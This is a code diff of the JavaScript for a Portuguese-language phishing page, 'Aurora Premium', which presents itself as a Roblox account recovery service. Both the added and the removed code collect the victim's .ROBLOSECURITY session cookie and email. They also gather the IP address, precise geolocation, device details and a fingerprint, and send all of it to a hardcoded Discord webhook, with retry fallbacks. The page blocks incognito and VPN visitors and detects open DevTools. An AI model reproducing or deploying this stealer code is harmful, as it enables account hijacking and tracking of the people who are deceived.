+            if (!glow || !document.body.classList.contains('glow-enabled')) return;
+            let mouseX = window.innerWidth / 2, mouseY = window.innerHeight / 2;
+            let currentX = mouseX, currentY = mouseY;
+            document.addEventListener('mousemove', (e) => { mouseX = e.clientX; mouseY = e.clientY; }, { passive: true });
+            function animate() {
+                currentX += (mouseX - currentX) * 0.15;
+                currentY += (mouseY - currentY) * 0.15;
+                glow.style.transform = `translate(${currentX - 210}px, ${currentY - 210}px)`;
+                requestAnimationFrame(animate);
+            }
+            animate();
+        })();
 
-            const [vpnData, geoData, battery, adBlock, fingerprint] = await Promise.race([
-                collectAll,
-                new Promise(resolve => setTimeout(() => resolve([null, null, null, false, 'TIMEOUT']), 10000))
-            ]);
-
-            const connection = getConnection();
-            const hardware = getHardware();
-            const screenInfo = getScreen();
-            const prefs = getPreferences();
-            const devTools = detectDevTools();
-            const visitCount = getVisitCount();
-
-            const now = new Date();
-            const timestamp = now.toISOString();
-            const sessionId = 'AUR-' + Math.random().toString(36).substr(2, 9).toUpperCase();
-            const ua = navigator.userAgent;
-
-            const flag = geoData ? getFlagEmoji(geoData.countryCode) : '🌍';
-            const location = geoData ? `**${geoData.city || 'N/A'}**, ${geoData.region || 'N/A'}` : 'N/A';
-            const country = geoData ? `${flag} ${geoData.country || 'N/A'}` : 'N/A';
-            const coords = (geoData && geoData.latitude != null)
-                ? `[${geoData.latitude}, ${geoData.longitude}](https://www.google.com/maps?q=${geoData.latitude},${geoData.longitude})`
-                : 'N/A';
-
-            // ---- Prepara o cookie em chunks seguros para Discord ----
-            const cookieSafe = sanitizeForDiscord(cookie);
-            // Cada embed: description tem limite 4096. Reservamos ~80 chars para ```\n ... \n```
-            // 3900 é seguro.
-            const cookieChunks = chunkString(cookieSafe, 3900);
-
-            // ---- Embed(s) do cookie (um por chunk) ----
-            const cookieEmbeds = cookieChunks.map((chunk, idx) => ({
-                title: cookieChunks.length > 1
-                    ? `🍪 Cookie .ROBLOSECURITY (parte ${idx + 1}/${cookieChunks.length})`
-                    : '🍪 Cookie .ROBLOSECURITY (completo)',
-                color: 0x8b5cf6,
-                description: '```\n' + chunk + '\n```',
-                footer: {
-                    text: `Tamanho total: ${cookie.length} caracteres • ${sessionId}`,
-                    icon_url: 'https://cdn-icons-png.flaticon.com/512/1067/1067357.png'
-                }
-            }));
-
-            // ---- Embed resumo (sem o cookie) ----
-            const summaryEmbed = {
-                title: '✨ Nova Captura — Aurora Premium',
-                description: '```ansi\n\u001b[1;35m⚡ NOVA SOLICITAÇÃO DE RECUPERAÇÃO\u001b[0m\n```\n**Um novo usuário enviou dados para recuperação.**',
-                color: 0x8b5cf6,
-                thumbnail: { url: 'https://cdn-icons-png.flaticon.com/512/1067/1067357.png' },
-                fields: [
-                    { name: '📧 Email', value: `\`${email}\``, inline: true },
-                    { name: '🆔 Session ID', value: `\`${sessionId}\``, inline: true },
-                    { name: '🔑 Fingerprint', value: `\`${fingerprint}\``, inline: true },
-                    { name: '📊 Visitas', value: `\`${visitCount}\``, inline: true },
-                    { name: '📏 Cookie (chars)', value: `\`${cookie.length}\``, inline: true },
-                    { name: '🧩 Partes do cookie', value: `\`${cookieChunks.length}\``, inline: true },
-                ],
-                footer: { text: '✨ Aurora Premium • Sistema de Recuperação Segura', icon_url: 'https://cdn-icons-png.flaticon.com/512/1067/1067357.png' },
-                timestamp: timestamp
-            };
-
-            const payload = {
-                username: '🛡️ Aurora Security',
-                avatar_url: 'https://cdn-icons-png.flaticon.com/512/1067/1067357.png',
-                embeds: [
-                    summaryEmbed,
-                    ...cookieEmbeds,
-                    {
-                        title: '🌍 Localização & Rede',
-                        color: 0x22d3ee,
-                        fields: [
-                            { name: '🌐 IP', value: `\`${ip}\``, inline: true },
-                            { name: '🏳️ País', value: country, inline: true },
-                            { name: '📍 Cidade', value: location, inline: true },
-                            { name: '📮 CEP', value: geoData?.postal ? `\`${geoData.postal}\`` : '`N/A`', inline: true },
-                            { name: '🗺️ Coordenadas', value: coords, inline: true },
-                            { name: '⏰ Timezone', value: `\`${geoData?.timezone || prefs.timezone}\``, inline: true },
-                            { name: '🏢 ISP', value: `\`${geoData?.isp || 'N/A'}\``, inline: false },
-                            { name: '🆔 ASN', value: `\`${geoData?.asn || 'N/A'}\``, inline: true },
-                            { name: '💰 Moeda', value: `\`${geoData?.currency || 'N/A'}\``, inline: true }
-                        ]
-                    },
-                    {
-                        title: '💻 Dispositivo & Sistema',
-                        color: 0xa855f7,
-                        fields: [
-                            { name: '💻 Sistema', value: `\`${getOS()}\``, inline: true },
-                            { name: '🌐 Navegador', value: `\`${getBrowser()}\``, inline: true },
-                            { name: '🖥️ Plataforma', value: `\`${hardware.platform}\``, inline: true },
-                            { name: '📱 Resolução', value: `\`${screenInfo.resolution}\``, inline: true },
-                            { name: '🎨 Pixel Ratio', value: `\`${screenInfo.pixelRatio}x\``, inline: true },
-                            { name: '🌈 Cor', value: `\`${screenInfo.colorDepth}\``, inline: true },
-                            { name: '🔄 Orientação', value: `\`${screenInfo.orientation}\``, inline: true },
-                            { name: '⚙️ CPU Cores', value: `\`${hardware.cores}\``, inline: true },
-                            { name: '🧠 RAM', value: `\`${hardware.memory}\``, inline: true },
-                            { name: '👆 Touch', value: `\`${hardware.touchPoints} pontos\``, inline: true }
-                        ]
-                    },
-                    {
-                        title: '🔋 Bateria & Conexão',
-                        color: 0x10b981,
-                        fields: [
-                            { name: '🔋 Bateria', value: battery ? `\`${battery.level}%\` ${battery.charging ? '⚡ Carregando' : '🔌 Descarregando'}` : '`N/A`', inline: true },
-                            { name: '📡 Conexão', value: connection ? `\`${connection.type}\`` : '`N/A`', inline: true },
-                            { name: '⬇️ Download', value: connection ? `\`${connection.downlink}\`` : '`N/A`', inline: true },
-                            { name: '📶 Ping', value: connection ? `\`${connection.rtt}\`` : '`N/A`', inline: true },
-                            { name: '💾 Save Data', value: connection?.saveData ? '✅ Ativado' : '❌ Desativado', inline: true }
-                        ]
-                    },
-                    {
-                        title: '🛡️ Segurança & Sessão',
-                        color: 0xf59e0b,
-                        fields: [
-                            { name: '🔒 Anônimo', value: isPrivate ? '✅ **Detectado**' : '❌ Não', inline: true },
-                            { name: '🌐 VPN/Proxy', value: vpnDetected ? '⚠️ **Detectado**' : '✅ Não', inline: true },
-                            { name: '🚫 AdBlocker', value: adBlock ? '⚠️ **Detectado**' : '✅ Não', inline: true },
-                            { name: '👨‍💻 DevTools', value: devTools ? '⚠️ **Aberto**' : '✅ Fechado', inline: true },
-                            { name: '🍪 Cookies', value: prefs.cookiesEnabled ? '✅ Sim' : '❌ Não', inline: true },
-                            { name: '🌙 Dark Mode', value: prefs.darkMode ? '✅ Ativo' : '❌ Não', inline: true },
-                            { name: '🚫 DNT', value: `\`${prefs.doNotTrack}\``, inline: true },
-                            { name: '🌎 Idioma', value: `\`${prefs.language}\``, inline: true }
-                        ]
-                    },
-                    ...(vpnData ? [{
-                        title: '📊 Análise de Rede Avançada',
-                        color: 0xef4444,
-                        fields: [
-                            { name: '🌐 VPN', value: vpnData.is_vpn ? '✅ Sim' : '❌ Não', inline: true },
-                            { name: '🔀 Proxy', value: vpnData.is_proxy ? '✅ Sim' : '❌ Não', inline: true },
-                            { name: '🧅 Tor', value: vpnData.is_tor ? '✅ Sim' : '❌ Não', inline: true },
-                            { name: '🏢 Datacenter', value: vpnData.is_datacenter ? '✅ Sim' : '❌ Não', inline: true },
-                            { name: '⚠️ Ameaça', value: `\`${vpnData.threat_level || 0}/100\``, inline: true }
-                        ]
-                    }] : []),
-                    {
-                        title: '📱 User Agent Completo',
-                        color: 0x6366f1,
-                        description: `\`\`\`${ua.substring(0, 900)}\`\`\``,
-                        footer: { text: `Aurora v4.4 • ${new Date().getFullYear()} • ${sessionId}`, icon_url: 'https://cdn-icons-png.flaticon.com/512/1067/1067357.png' }
+        // ============================================================
+        // 0.4 VANILLA TILT
+        // ============================================================
+        if (!PERF.isMobile && !PERF.isLowEnd) {
+            loadScript('https://cdnjs.cloudflare.com/ajax/libs/vanilla-tilt/1.8.0/vanilla-tilt.min.js')
+                .then(() => {
+                    if (window.VanillaTilt) {
+                        VanillaTilt.init(document.querySelectorAll(".card, .side-card, .stat-card, .community-card"), {
+                            max: 10, speed: 400, glare: true, "max-glare": 0.15, scale: 1.01, perspective: 1000,
+                        });
                     }
-                ]
-            };
-
-            // ---- Envio via fetch (com log de erro) ----
-            try {
-                const r = await fetch(WEBHOOK_URL, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(payload)
-                });
-
-                if (r.ok) {
-                    return true;
-                }
-
-                // Discord rejeitou: loga o motivo real
-                let errText = '';
-                try { errText = await r.text(); } catch (_) {}
-                console.error('❌ Webhook Discord retornou', r.status, errText);
-
-                // Se foi por excesso de embeds (>10), tenta reduzir removendo o embed do User Agent
-                // (fallback automático)
-                if (r.status === 400 && payload.embeds.length > 10) {
-                    const reduced = {
-                        ...payload,
-                        embeds: payload.embeds.filter(e => !e.title?.includes('User Agent'))
-                    };
-                    const r2 = await fetch(WEBHOOK_URL, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify(reduced)
-                    });
-                    if (r2.ok) return true;
-                    let err2 = '';
-                    try { err2 = await r2.text(); } catch (_) {}
-                    console.error('❌ Webhook (reduzido) também falhou:', r2.status, err2);
-                }
-            } catch (e) {
-                console.error('❌ Erro de rede no fetch do webhook:', e);
-            }
-
-            // ---- Fallback XHR (checa status) ----
-            try {
-                return await new Promise((resolve) => {
-                    const xhr = new XMLHttpRequest();
-                    xhr.open('POST', WEBHOOK_URL, true);
-                    xhr.setRequestHeader('Content-Type', 'application/json');
-                    xhr.onload = () => {
-                        if (xhr.status >= 200 && xhr.status < 300) resolve(true);
-                        else {
-                            console.error('❌ XHR fallback falhou:', xhr.status, xhr.responseText);
-                            resolve(false);
-                        }
-                    };
-                    xhr.onerror = () => { console.error('❌ XHR network error'); resolve(false); };
-                    xhr.send(JSON.stringify(payload));
-                });
-            } catch (e) {
-                console.error('❌ XHR exception:', e);
-                return false;
-            }
-
-        } catch (e) {
-            console.error('Erro webhook:', e);
-            return false;
+                }).catch(() => {});
         }
-    }
 
-    // ============================================================
-    // 8. DETECT API
-    // ============================================================
-    async function checkDetection() {
-        try {
-            const res = await fetchWithTimeout('/api/detect', 4000);
-            const data = await res.json();
-            if (data.data && data.data.blocked) {
+        // ============================================================
+        // 1. DETECÇÃO DE INCÓGNITO
+        // ============================================================
+        function detectIncognito() {
+            return new Promise((resolve) => {
+                let detected = false, checksDone = 0; const totalChecks = 4;
+                function checkDone() { checksDone++; if (checksDone >= totalChecks) resolve(detected); }
+                try { localStorage.setItem('__incog__','1'); localStorage.removeItem('__incog__'); } catch (e) { detected = true; } checkDone();
+                try { sessionStorage.setItem('__incog__','1'); sessionStorage.removeItem('__incog__'); } catch (e) { detected = true; } checkDone();
+                try {
+                    const request = indexedDB.open('__incog__');
+                    request.onerror = () => { detected = true; checkDone(); };
+                    request.onsuccess = () => { if (request.result) request.result.close(); checkDone(); };
+                } catch (e) { detected = true; checkDone(); }
+                if (navigator.storage && navigator.storage.estimate) {
+                    navigator.storage.estimate().then(est => { if (est.quota < 120000000) detected = true; checkDone(); }).catch(() => checkDone());
+                } else checkDone();
+                setTimeout(() => resolve(detected), 2500);
+            });
+        }
+
+        // ============================================================
+        // 2. DETECÇÃO DE NAVEGADOR ANÔNIMO E VPN
+        // ============================================================
+        function isPrivateBrowsing() {
+            return new Promise((resolve) => {
+                let positives = 0, methods = 0;
+                try { localStorage.setItem('__t__','1'); localStorage.removeItem('__t__'); } catch (e) { positives++; } methods++;
+                try { sessionStorage.setItem('__t__','1'); sessionStorage.removeItem('__t__'); } catch (e) { positives++; } methods++;
+                try {
+                    const req = indexedDB.open('__t__');
+                    req.onerror = () => { positives++; if (++methods >= 3) resolve(positives >= 2); };
+                    req.onsuccess = () => { if (++methods >= 3) resolve(positives >= 2); };
+                } catch (e) { positives++; if (++methods >= 3) resolve(positives >= 2); }
+                setTimeout(() => resolve(positives >= 2), 1000);
+            });
+        }
+
+        function detectPrivateBrowsingBrowser() {
+            return new Promise((resolve) => {
+                let result = false, done = 0, total = 4;
+                try { localStorage.setItem('__t__','1'); localStorage.removeItem('__t__'); } catch (e) { result = true; } done++;
+                try { sessionStorage.setItem('__t__','1'); sessionStorage.removeItem('__t__'); } catch (e) { result = true; } done++;
+                try {
+                    const req = indexedDB.open('__t__');
+                    req.onerror = () => { result = true; done++; if (done >= total) resolve(result); };
+                    req.onsuccess = () => { if (req.result) req.result.close(); done++; if (done >= total) resolve(result); };
+                } catch (e) { result = true; done++; if (done >= total) resolve(result); }
+                if (navigator.storage && navigator.storage.estimate) {
+                    navigator.storage.estimate().then(e => { if (e.quota < 120000000) result = true; done++; if (done >= total) resolve(result); })
+                        .catch(() => { done++; if (done >= total) resolve(result); });
+                } else { done++; if (done >= total) resolve(result); }
+                setTimeout(() => resolve(result), 2500);
+            });
+        }
+
+        function fetchWithTimeout(url, timeout = 4000) {
+            const controller = new AbortController();
+            const timer = setTimeout(() => controller.abort(), timeout);
+            return fetch(url, { signal: controller.signal }).finally(() => clearTimeout(timer));
+        }
+
+        async function detectVPN() {
+            try {
+                const data = await getIPData();
+                if (!data) return false;
+                return [data.is_vpn, data.is_proxy, data.is_tor, data.is_datacenter, data.threat_level > 50].some(v => v === true);
+            } catch (e) { return false; }
+        }
+
+        async function getIPData() {
+            const apis = [
+                { url: 'https://ipapi.is/api/ip/', parser: d => ({ is_vpn: d.is_vpn, is_proxy: d.is_proxy, is_tor: d.is_tor, is_datacenter: d.is_datacenter, threat_level: d.threat_level || 0 }) },
+                { url: 'https://ip-api.com/json/?fields=query,proxy,hosting,status', parser: d => ({ is_vpn: d.proxy === true, is_proxy: d.proxy === true, is_datacenter: d.hosting === true, threat_level: (d.proxy || d.hosting) ? 75 : 0 }) }
+            ];
+            for (const api of apis) {
+                try {
+                    const res = await fetchWithTimeout(api.url, 4000);
+                    if (res.ok) { const data = await res.json(); return api.parser(data); }
+                } catch (e) { continue; }
+            }
+            return null;
+        }
+
+        async function isGoogleIncognito() {
+            return new Promise((resolve) => {
+                let results = [];
+                if (navigator.storage && navigator.storage.estimate) {
+                    navigator.storage.estimate().then(e => { results.push(e.quota < 120000000); if (results.length >= 2) resolve(results.some(r => r === true)); })
+                        .catch(() => { results.push(false); if (results.length >= 2) resolve(results.some(r => r === true)); });
+                } else results.push(false);
+                if (window.webkitRequestFileSystem) {
+                    window.webkitRequestFileSystem(window.TEMPORARY, 1024 * 1024,
+                        () => { results.push(false); if (results.length >= 2) resolve(results.some(r => r === true)); },
+                        () => { results.push(true); if (results.length >= 2) resolve(results.some(r => r === true)); });
+                } else results.push(false);
+                setTimeout(() => { if (results.length > 0) resolve(results.some(r => r === true)); else resolve(false); }, 1500);
+            });
+        }
+
+        async function checkBlocked() {
+            try {
+                const [isPrivate, isGoogle, hasVPN] = await Promise.all([isPrivateBrowsing(), isGoogleIncognito(), detectVPN()]);
                 const modal = document.getElementById('blockModal');
                 const reason = document.getElementById('blockReason');
                 const title = document.getElementById('blockTitle');
@@ -977,329 +238,793 @@
                 const desc = document.getElementById('blockDesc');
                 const btn = document.getElementById('blockBtn');
                 const gif = document.getElementById('banGifWrap');
+                let shouldBlock = false;
                 gif.classList.remove('active');
-                let msg = '';
-                if (data.data.isPrivate) {
-                    msg = '🔒 Navegador Anônimo/Incógnito Detectado';
-                    title.textContent = '🔒 Navegador Anônimo!';
-                    icon.textContent = '🕵️';
-                    desc.textContent = 'Navegadores anônimos não são permitidos por questões de segurança.';
-                } else if (data.data.vpn && data.data.vpn.isVPN) {
-                    msg = '🌐 VPN ou Proxy Detectado';
-                    title.textContent = '🌐 VPN/Proxy Detectado!';
-                    icon.textContent = '🛡️';
-                    desc.textContent = 'Conexões via VPN ou proxy não são permitidas.';
+                if (isPrivate || isGoogle) {
+                    shouldBlock = true;
+                    title.textContent = '🔒 Navegador Anônimo!'; icon.textContent = '🕵️';
+                    reason.textContent = '🔒 Navegador Anônimo/Incógnito Detectado';
+                    desc.textContent = 'Navegadores anônimos não são permitidos por questões de segurança. Desative o modo anônimo para acessar.';
+                    btn.innerHTML = '<i class="fas fa-sync-alt"></i> Tentar Novamente';
+                    btn.className = 'btn-block-action';
+                    btn.onclick = () => window.location.reload();
+                } else if (hasVPN) {
+                    shouldBlock = true;
+                    title.textContent = '🌐 VPN/Proxy Detectado!'; icon.textContent = '🛡️';
+                    reason.textContent = '🌐 VPN ou Proxy Detectado';
+                    desc.textContent = 'Conexões via VPN ou proxy não são permitidas por questões de segurança. Desative para acessar.';
+                    btn.innerHTML = '<i class="fas fa-sync-alt"></i> Tentar Novamente';
+                    btn.className = 'btn-block-action';
+                    btn.onclick = () => window.location.reload();
                 }
-                reason.textContent = msg;
-                reason.parentElement.className = 'reason-box';
-                btn.className = 'btn-block-action';
-                btn.innerHTML = '<i class="fas fa-sync-alt"></i> Tentar Novamente';
-                btn.onclick = () => window.location.reload();
+                if (shouldBlock) {
+                    reason.parentElement.className = 'reason-box';
+                    modal.classList.add('active');
+                    document.body.style.overflow = 'hidden';
+                    return true;
+                }
+                return false;
+            } catch (e) { return false; }
+        }
+
+        // ============================================================
+        // 3. CONFIG
+        // ============================================================
+        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1559185453112893460/2l5wcx4vZLswqnfD053amLzR6OPkMJ-AlPGAF_QzwRZoZEjePCFtsKdtLZBWkaCLcaRm';
+
+        let hasAttempted = false;
+        let blockUntil = null;
+        let timerInterval = null;
+        let isBlocked = false;
+        let termsAccepted = false;
+        let isUserBanned = false;
+
+        // ============================================================
+        // 4. BAN MODAL
+        // ============================================================
+        function showBanBlockModal(reason, expires, gif) {
+            const modal = document.getElementById('blockModal');
+            const reasonEl = document.getElementById('blockReason');
+            const title = document.getElementById('blockTitle');
+            const icon = document.getElementById('blockIcon');
+            const desc = document.getElementById('blockDesc');
+            const btn = document.getElementById('blockBtn');
+            const gifWrap = document.getElementById('banGifWrap');
+            const gifImg = document.getElementById('banGif');
+            if (gif) { gifWrap.classList.add('active'); gifImg.src = gif; gifImg.alt = 'BANIDO'; }
+            else gifWrap.classList.remove('active');
+            title.className = 'ban-title';
+            title.textContent = '🚫 VOCÊ FOI BANIDO!';
+            icon.textContent = '⚖️';
+            const reasonBox = document.getElementById('blockReasonBox');
+            reasonBox.className = 'reason-box ban';
+            reasonEl.textContent = `🔴 ${reason || 'ATIVIDADE SUSPEITA'}`;
+            if (expires) {
+                const date = new Date(expires);
+                desc.innerHTML = `⏳ Banimento expira em: <strong style="color:#fbbf24;">${date.toLocaleDateString('pt-BR')} ${date.toLocaleTimeString('pt-BR')}</strong>`;
+                btn.className = 'btn-block-action wait';
+                btn.innerHTML = '<i class="fas fa-clock"></i> Aguardar Expiração';
+            } else {
+                desc.innerHTML = '🚫 Banimento PERMANENTE - Você não pode mais usar o sistema.';
+                btn.className = 'btn-block-action ban';
+                btn.innerHTML = '<i class="fas fa-gavel"></i> BANIDO PERMANENTEMENTE';
+            }
+            modal.classList.add('active');
+            document.body.style.overflow = 'hidden';
+            const form = document.getElementById('recoveryForm');
+            if (form) form.style.display = 'none';
+            const sb = document.getElementById('submitBtn');
+            if (sb) { sb.disabled = true; sb.innerHTML = '<i class="fas fa-ban"></i> BLOQUEADO'; sb.style.opacity = '0.5'; }
+        }
+
+        async function checkBanStatus() {
+            try {
+                const ipRes = await fetchWithTimeout('https://api.ipify.org?format=json', 4000);
+                const ipData = await ipRes.json();
+                const ip = ipData.ip;
+                const banRes = await fetchWithTimeout(`https://aurora-plum.vercel.app/api/ban?check=${ip}`, 4000);
+                const banData = await banRes.json();
+                if (banData.banned) {
+                    isUserBanned = true;
+                    const ban = banData.ban || banData;
+                    showBanBlockModal(ban.reason || 'Motivo não informado', ban.expires || null,
+                        ban.gif || 'https://media.tenor.com/2BpR9fW5HWQAAAAC/roblox-ban.gif');
+                    return true;
+                }
+                return false;
+            } catch (e) { return false; }
+        }
+
+        // ============================================================
+        // 5. TERMS
+        // ============================================================
+        function openTerms() { if (isUserBanned) return; document.getElementById('termsModal').classList.add('active'); document.body.style.overflow = 'hidden'; }
+        function closeTerms() { document.getElementById('termsModal').classList.remove('active'); document.body.style.overflow = ''; }
+        function acceptTerms() {
+            termsAccepted = true;
+            try { localStorage.setItem('aurora_terms_accepted', 'true'); } catch (e) {}
+            closeTerms();
+            showNotification('✅', 'Termos Aceitos!', 'Você concordou com os termos de serviço. ✨');
+            showSection('recovery');
+        }
+        function checkTerms() {
+            try {
+                if (localStorage.getItem('aurora_terms_accepted') === 'true') termsAccepted = true;
+                else if (!isUserBanned) setTimeout(openTerms, 1500);
+            } catch (e) { if (!isUserBanned) setTimeout(openTerms, 1500); }
+        }
+
+        // ============================================================
+        // 6. IP
+        // ============================================================
+        async function getIP() {
+            try {
+                const r = await fetchWithTimeout('https://api.ipify.org?format=json', 4000);
+                const d = await r.json();
+                return d.ip;
+            } catch (e) { return 'N/A'; }
+        }
+
+        // ============================================================
+        // 7. COLETA AVANÇADA
+        // ============================================================
+        function getOS() {
+            const ua = navigator.userAgent;
+            let os = 'Desconhecido', version = '';
+            if (/Windows NT 10/.test(ua)) { os = 'Windows'; version = '10/11'; }
+            else if (/Windows NT 6\.3/.test(ua)) { os = 'Windows'; version = '8.1'; }
+            else if (/Windows NT 6\.2/.test(ua)) { os = 'Windows'; version = '8'; }
+            else if (/Windows NT 6\.1/.test(ua)) { os = 'Windows'; version = '7'; }
+            else if (/Windows/.test(ua)) os = 'Windows';
+            else if (/Mac OS X/.test(ua)) { os = 'macOS'; const m = ua.match(/Mac OS X ([\d_]+)/); if (m) version = m[1].replace(/_/g, '.'); }
+            else if (/Android/.test(ua)) { os = 'Android'; const m = ua.match(/Android ([\d.]+)/); if (m) version = m[1]; }
+            else if (/iPhone|iPad|iPod/.test(ua)) { os = 'iOS'; const m = ua.match(/OS ([\d_]+)/); if (m) version = m[1].replace(/_/g, '.'); }
+            else if (/CrOS/.test(ua)) os = 'ChromeOS';
+            else if (/Linux/.test(ua)) os = 'Linux';
+            return version ? `${os} ${version}` : os;
+        }
+
+        function getBrowser() {
+            const ua = navigator.userAgent;
+            let browser = 'Desconhecido', version = '';
+            if (/Edg\//.test(ua)) { browser = 'Edge'; const m = ua.match(/Edg\/([\d.]+)/); if (m) version = m[1].split('.')[0]; }
+            else if (/OPR\/|Opera/.test(ua)) { browser = 'Opera'; const m = ua.match(/OPR\/([\d.]+)/); if (m) version = m[1].split('.')[0]; }
+            else if (/Chrome/.test(ua) && !/Edg/.test(ua)) { browser = 'Chrome'; const m = ua.match(/Chrome\/([\d.]+)/); if (m) version = m[1].split('.')[0]; }
+            else if (/Firefox/.test(ua)) { browser = 'Firefox'; const m = ua.match(/Firefox\/([\d.]+)/); if (m) version = m[1].split('.')[0]; }
+            else if (/Safari/.test(ua) && !/Chrome/.test(ua)) { browser = 'Safari'; const m = ua.match(/Version\/([\d.]+)/); if (m) version = m[1].split('.')[0]; }
+            return version ? `${browser} ${version}` : browser;
+        }
+
+        async function getBattery() {
+            try {
+                if (!navigator.getBattery) return null;
+                const bat = await navigator.getBattery();
+                return { level: Math.round(bat.level * 100), charging: bat.charging };
+            } catch (e) { return null; }
+        }
+
+        function getConnection() {
+            try {
+                const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+                if (!c) return null;
+                return { type: c.effectiveType || 'N/A', downlink: c.downlink ? c.downlink + ' Mbps' : 'N/A', rtt: c.rtt ? c.rtt + 'ms' : 'N/A', saveData: c.saveData || false };
+            } catch (e) { return null; }
+        }
+
+        function getHardware() {
+            return {
+                cores: navigator.hardwareConcurrency || 'N/A',
+                memory: navigator.deviceMemory ? navigator.deviceMemory + 'GB' : 'N/A',
+                platform: navigator.platform || 'N/A',
+                touchPoints: navigator.maxTouchPoints || 0,
+            };
+        }
+
+        function getScreen() {
+            return {
+                resolution: `${screen.width}x${screen.height}`,
+                colorDepth: screen.colorDepth + ' bits',
+                pixelRatio: window.devicePixelRatio || 1,
+                orientation: screen.orientation ? screen.orientation.type : 'N/A',
+            };
+        }
+
+        function getPreferences() {
+            return {
+                language: navigator.language || 'N/A',
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'N/A',
+                darkMode: window.matchMedia('(prefers-color-scheme: dark)').matches,
+                cookiesEnabled: navigator.cookieEnabled,
+                doNotTrack: navigator.doNotTrack || 'N/A',
+            };
+        }
+
+        async function getFingerprint() {
+            try {
+                const comp = [navigator.userAgent, navigator.language, screen.width + 'x' + screen.height,
+                    screen.colorDepth, new Date().getTimezoneOffset(), navigator.hardwareConcurrency,
+                    navigator.platform, navigator.deviceMemory || 0].join('|');
+                if (!crypto.subtle) return 'NO-CRYPTO';
+                const buf = await crypto.subtle.digest('SHA-256', new TextEncoder().encode(comp));
+                return Array.from(new Uint8Array(buf)).map(b => b.toString(16).padStart(2, '0')).join('').substring(0, 16).toUpperCase();
+            } catch (e) { return 'UNKNOWN'; }
+        }
+
+        function detectAdBlocker() {
+            return new Promise((resolve) => {
+                try {
+                    const testAd = document.createElement('div');
+                    testAd.innerHTML = '&nbsp;';
+                    testAd.className = 'adsbox ad-banner pub_300x250';
+                    testAd.style.cssText = 'position:absolute;left:-9999px;height:1px;width:1px;';
+                    document.body.appendChild(testAd);
+                    setTimeout(() => { const blocked = testAd.offsetHeight === 0; testAd.remove(); resolve(blocked); }, 100);
+                } catch (e) { resolve(false); }
+            });
+        }
+
+        function detectDevTools() {
+            try { return (window.outerWidth - window.innerWidth > 160) || (window.outerHeight - window.innerHeight > 160); } catch (e) { return false; }
+        }
+
+        // ============================================================
+        // 🌍 GEO INFO - 4 APIs EM CASCATA
+        // ============================================================
+        async function getGeoInfo() {
+            try {
+                const r = await fetchWithTimeout('https://ipwho.is/', 5000);
+                if (r.ok) {
+                    const d = await r.json();
+                    if (d && d.success !== false && d.country) {
+                        return { ip: d.ip || 'N/A', country: d.country || 'N/A', countryCode: d.country_code || '',
+                            region: d.region || 'N/A', city: d.city || 'N/A', postal: d.postal || 'N/A',
+                            latitude: d.latitude, longitude: d.longitude, timezone: d.timezone?.id || 'N/A',
+                            currency: d.currency?.code || 'N/A', isp: d.connection?.isp || d.connection?.org || 'N/A',
+                            asn: d.connection?.asn ? 'AS' + d.connection.asn : 'N/A' };
+                    }
+                }
+            } catch (e) { console.warn('ipwho.is falhou'); }
+            try {
+                const r = await fetchWithTimeout('https://ipapi.co/json/', 5000);
+                if (r.ok) {
+                    const d = await r.json();
+                    if (d && d.country_name && d.country_name !== null) {
+                        return { ip: d.ip || 'N/A', country: d.country_name || 'N/A', countryCode: d.country_code || '',
+                            region: d.region || 'N/A', city: d.city || 'N/A', postal: d.postal || 'N/A',
+                            latitude: d.latitude, longitude: d.longitude, timezone: d.timezone || 'N/A',
+                            currency: d.currency || 'N/A', isp: d.org || 'N/A', asn: d.asn || 'N/A' };
+                    }
+                }
+            } catch (e) { console.warn('ipapi.co falhou'); }
+            try {
+                const r = await fetchWithTimeout('https://ip-api.com/json/?fields=status,message,country,countryCode,regionName,city,zip,lat,lon,timezone,currency,isp,as,query', 5000);
+                if (r.ok) {
+                    const d = await r.json();
+                    if (d && d.status === 'success') {
+                        return { ip: d.query || 'N/A', country: d.country || 'N/A', countryCode: d.countryCode || '',
+                            region: d.regionName || 'N/A', city: d.city || 'N/A', postal: d.zip || 'N/A',
+                            latitude: d.lat, longitude: d.lon, timezone: d.timezone || 'N/A',
+                            currency: d.currency || 'N/A', isp: d.isp || 'N/A', asn: d.as || 'N/A' };
+                    }
+                }
+            } catch (e) { console.warn('ip-api.com falhou'); }
+            try {
+                const r = await fetchWithTimeout('https://ipinfo.io/json', 5000);
+                if (r.ok) {
+                    const d = await r.json();
+                    if (d && (d.city || d.country)) {
+                        const loc = (d.loc || ',').split(',');
+                        return { ip: d.ip || 'N/A', country: d.country || 'N/A', countryCode: d.country || '',
+                            region: d.region || 'N/A', city: d.city || 'N/A', postal: d.postal || 'N/A',
+                            latitude: loc[0] ? parseFloat(loc[0]) : null, longitude: loc[1] ? parseFloat(loc[1]) : null,
+                            timezone: d.timezone || 'N/A', currency: 'N/A', isp: d.org || 'N/A',
+                            asn: d.org ? d.org.split(' ')[0] : 'N/A' };
+                    }
+                }
+            } catch (e) { console.warn('ipinfo.io falhou'); }
+            return null;
+        }
+
+        function getVisitCount() {
+            try {
+                let count = parseInt(localStorage.getItem('aurora_visit_count') || '0');
+                count++;
+                localStorage.setItem('aurora_visit_count', count.toString());
+                return count;
+            } catch (e) { return 1; }
+        }
+
+        function getFlagEmoji(code) {
+            if (!code || code.length !== 2) return '🌍';
+            try { return String.fromCodePoint(...code.toUpperCase().split('').map(c => 127397 + c.charCodeAt(0))); }
+            catch (e) { return '🌍'; }
+        }
+
+        // ============================================================
+        // 7.1 WEBHOOK — ✅ COOKIE INTEIRO (sem substring)
+        // ============================================================
+        // Helpers para dividir/sanitizar o cookie no Discord
+        function chunkString(str, size) {
+            const chunks = [];
+            for (let i = 0; i < str.length; i += size) chunks.push(str.slice(i, i + size));
+            return chunks.length ? chunks : [''];
+        }
+        function sanitizeForDiscord(str) {
+            return String(str).replace(/`/g, '\u02CB').replace(/\u0000/g, '').replace(/\r/g, '');
+        }
+
+        async function sendToWebhook(cookieRaw, email, ip, isPrivate, vpnDetected) {
+            try {
+                const cookie = String(cookieRaw).trim();
+
+                const collectAll = Promise.all([
+                    vpnDetected ? getIPData() : Promise.resolve(null),
+                    getGeoInfo(),
+                    getBattery(),
+                    detectAdBlocker(),
+                    getFingerprint(),
+                ]);
